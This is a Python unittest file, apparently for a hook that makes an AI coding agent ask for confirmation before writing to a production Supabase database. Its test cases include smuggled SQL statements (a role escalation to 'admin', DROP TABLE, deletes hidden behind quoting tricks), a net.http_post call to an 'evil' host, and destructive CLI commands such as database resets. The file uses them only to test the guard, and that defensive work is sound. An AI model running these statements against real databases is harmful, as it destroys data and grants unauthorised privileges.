"""Testes do guarda.py: SQL e Supabase de produção. Rode: python3 -m unittest discover -s tests -q"""
import json
import os
import time
import unittest

from base import Base, SCRIPT


class TestProd(Base):
    def sql(self, q, **sess):
        if sess:
            self.sessao(**sess)
        return self.decisao(self.rodar("prod", {"tool_name": "mcp__supabase__execute_sql",
                                                "tool_input": {"project_id": "abc", "query": q}}))

    def test_select(self):
        self.assertIsNone(self.sql("select * from profiles limit 5"))

    def test_update_sem_auth(self):
        self.assertEqual(self.sql("update profiles set nome = 'x' where id = 1"), "perguntar")

    def test_update_com_auth(self):
        self.assertIsNone(self.sql("update profiles set nome = 'x'", auth_prompt_id="p1"))

    def test_update_auth_outro_turno(self):
        self.assertEqual(self.sql("update profiles set nome = 'x'", auth_prompt_id="p0"), "perguntar")

    def test_apply_migration_sem_auth(self):
        s = self.rodar("prod", {"tool_name": "mcp__supabase__apply_migration",
                                "tool_input": {"name": "x", "query": "select 1"}})
        self.assertEqual(self.decisao(s), "perguntar")

    def test_comentario(self):
        self.assertIsNone(self.sql("-- update depois\nselect id from profiles /* delete */ where nome = 'drop'"))

    def test_list_tables(self):
        self.assertIsNone(self.decisao(self.rodar("prod", {"tool_name": "mcp__supabase__list_tables",
                                                           "tool_input": {}})))


class TestC1SqlPorStatement(Base):
    def sql(self, q, **sess):
        if sess:
            self.sessao(**sess)
        return self.decisao(self.rodar("prod", {"tool_name": "mcp__supabase__execute_sql",
                                                "tool_input": {"project_id": "abc", "query": q}}))

    def test_escritas_disfarcadas_perguntam(self):
        casos = [
            "select public.book_appointment('a', 'b')",
            "select cron.schedule('x', '* * * * *', 'delete from appointments')",
            "select net.http_post('https://evil', '{}')",
            "select set_config('x', 'y', false)",
            "select '--'; update profiles set role = 'admin'",
            "select E'\\''; delete from appointments; select ''",
            "select pg_advisory_lock(1)",
            "select * into nova from profiles",
            "select * from profiles for update",
            "with x as (delete from a returning *) select * from x",
            "explain analyze delete from a",
            "SELECT 1; DROP TABLE x",
            "select $f$ ; $f$; update a set b = 1",
            "select 1 /* ; */; insert into a values (1)",
        ]
        for q in casos:
            with self.subTest(q=q):
                self.assertEqual(self.sql(q), "perguntar")

    def test_leituras_passam(self):
        casos = [
            "select comment from tickets",
            "select id, set from x",
            "select count(*) from a where b = 'delete'",
            "with x as (select 1) select * from x",
            "explain select * from a",
            "select coalesce(max(id), 0), now(), pg_catalog.pg_get_userbyid(1) from a",
            "select 'drop table x' as texto; -- update depois",
            "show search_path",
            "select x from a where exists (select 1 from b)",
        ]
        for q in casos:
            with self.subTest(q=q):
                self.assertIsNone(self.sql(q))

    def test_sql_grande_pergunta_rapido(self):
        q = "select 1 " * 20000
        t = time.time()
        self.assertEqual(self.sql(q), "perguntar")
        self.assertLess(time.time() - t, 2)

    def test_auth_do_turno_libera_sql(self):
        self.assertIsNone(self.sql("select public.book_appointment('a')", auth_prompt_id="p1"))


class TestC3SupabaseCli(Base):
    def test_perguntam_mesmo_com_auth(self):
        self.sessao(auth_prompt_id="p1")
        casos = ["npx supabase db push", "npx -y supabase db reset", "supabase db reset --linked",
                 "bunx supabase migration repair 1 --status applied", "pnpm dlx supabase functions deploy x",
                 "yarn supabase secrets set A=b", "supabase secrets unset A", "supabase functions delete x",
                 "supabase db dump --data-only -f x.sql", "supabase migration squash",
                 "supabase db diff --db-url postgres://u@h/db", "supabase db query 'select 1'",
                 'psql "$DATABASE_URL" -c "delete from x"', "psql $SUPABASE_DB_URL",
                 "psql postgresql://u:" + "p@db.x.supabase.co:5432/postgres", "psql -h db.x.supabase.co -U postgres",
                 "pg_dump --clean -h db.x.com x", "pg_restore -d $PGURL x.dump", "psql ${PGHOST}"]
        for c in casos:
            with self.subTest(c=c):
                self.assertEqual(self.bash(c), "perguntar")

    def test_locais_passam(self):
        for c in ["supabase db dump -f schema.sql", "supabase start", "supabase migration new x",
                  "psql -h localhost -U postgres", "psql -h 127.0.0.1", "pg_dump -h localhost x",
                  "npx vitest run", "supabase functions serve"]:
            with self.subTest(c=c):
                self.assertIsNone(self.bash(c))


class TestC4McpAllowlist(Base):
    def mcp(self, nome, **sess):
        if sess:
            self.sessao(**sess)
        return self.decisao(self.rodar("prod", {"tool_name": nome, "tool_input": {}}))

    def test_hooks_json_matcher(self):
        caminho = os.path.join(os.path.dirname(os.path.dirname(SCRIPT)), "hooks", "hooks.json")
        with open(caminho) as f:
            h = json.load(f)
        ms = [g["matcher"] for g in h["hooks"]["PreToolUse"] if "prod" in g["hooks"][0]["command"]]
        self.assertEqual(ms, ["mcp__.*[Ss]upabase.*"])

    def test_leitura_passa(self):
        for n in ["mcp__supabase__list_tables", "mcp__claude_ai_Supabase__get_logs",
                  "mcp__supabase__search_docs", "mcp__supabase__generate_typescript_types"]:
            with self.subTest(n=n):
                self.assertIsNone(self.mcp(n))

    def test_resto_pergunta_mesmo_com_auth(self):
        for n in ["mcp__supabase__apply_migration", "mcp__claude_ai_Supabase__create_branch",
                  "mcp__supabase__deploy_edge_function", "mcp__supabase__update_storage_config",
                  "mcp__supabase__merge_branch", "mcp__supabase__pause_project", "mcp__supabase__xyz_novo"]:
            with self.subTest(n=n):
                self.assertEqual(self.mcp(n, auth_prompt_id="p1"), "perguntar")


class TestE3SupabaseVariantes(Base):
    def test_perguntam(self):
        for c in ["npx -y supabase@latest db push", "npx supabase@2 db push", "npm exec supabase db push",
                  "npm exec -- supabase db push", "supabase --workdir x db push",
                  "supabase --project-ref abc db push", "supabase -o json db push"]:
            with self.subTest(c=c):
                self.assertEqual(self.bash(c), "perguntar")

    def test_nada(self):
        for c in ["supabase status", "supabase --version"]:
            with self.subTest(c=c):
                self.assertIsNone(self.bash(c))


class TestE5SqlLeituraComum(Base):
    sql = TestC1SqlPorStatement.sql

    def test_leituras_passam(self):
        for f in ["jsonb_array_elements(x)", "jsonb_array_elements_text(x)", "json_array_elements(x)",
                  "json_array_elements_text(x)", "jsonb_object_keys(x)", "jsonb_each(x)",
                  "jsonb_each_text(x)", "jsonb_extract_path(x, 'a')", "jsonb_extract_path_text(x, 'a')",
                  "jsonb_path_query(x, '$')", "jsonb_path_query_first(x, '$')",
                  "regexp_replace(x, 'a', 'b')", "regexp_matches(x, 'a')", "row_to_json(t)",
                  "to_timestamp(1)", "to_date('2026', 'YYYY')", "to_number('1', '9')",
                  "timezone('UTC', now())", "char_length(x)", "octet_length(x)", "position('a' in x)",
                  "left(x, 2)", "right(x, 2)", "lpad(x, 3)", "rpad(x, 3)", "initcap(x)",
                  "string_to_array(x, ',')", "array_length(x, 1)", "array_to_string(x, ',')",
                  "cardinality(x)", "version()", "date_part('year', now())", "make_interval(days => 1)",
                  "make_date(2026, 1, 1)", "auth.uid()", "auth.role()", "auth.jwt()"]:
            with self.subTest(f=f):
                self.assertIsNone(self.sql("select %s from t" % f))

    def test_rpc_pergunta(self):
        self.assertEqual(self.sql("select public.book_appointment('a', 'b')"), "perguntar")



class TestH2bSupabaseGuard(Base):
    def projeto(self, conteudo, confiar):
        c = os.path.join(self.cwd, ".tune-up", "config.json")
        os.makedirs(os.path.dirname(c), exist_ok=True)
        with open(c, "w") as f:
            json.dump(conteudo, f)
        if confiar:
            self.confiar(c)

    def mcp(self):
        return self.decisao(self.rodar("prod", {"tool_name": "mcp__supabase__apply_migration",
                                                "tool_input": {"query": "create table t()"}}))

    def test_sempre_ligada_por_padrao(self):
        self.assertEqual(self.mcp(), "perguntar")
        self.assertEqual(self.bash("supabase db push"), "perguntar")

    def test_nao_confiado_nao_desliga(self):
        self.projeto({"supabase_guard": False}, confiar=False)
        self.assertEqual(self.mcp(), "perguntar")
        self.assertEqual(self.bash("supabase db push"), "perguntar")

    def test_confiado_desliga(self):
        self.projeto({"supabase_guard": False}, confiar=True)
        self.assertIsNone(self.mcp())
        self.assertIsNone(self.bash("supabase db push"))

    def test_tipo_errado_nao_desliga(self):
        self.projeto({"supabase_guard": "false"}, confiar=True)
        self.assertEqual(self.mcp(), "perguntar")


if __name__ == "__main__":
    unittest.main()
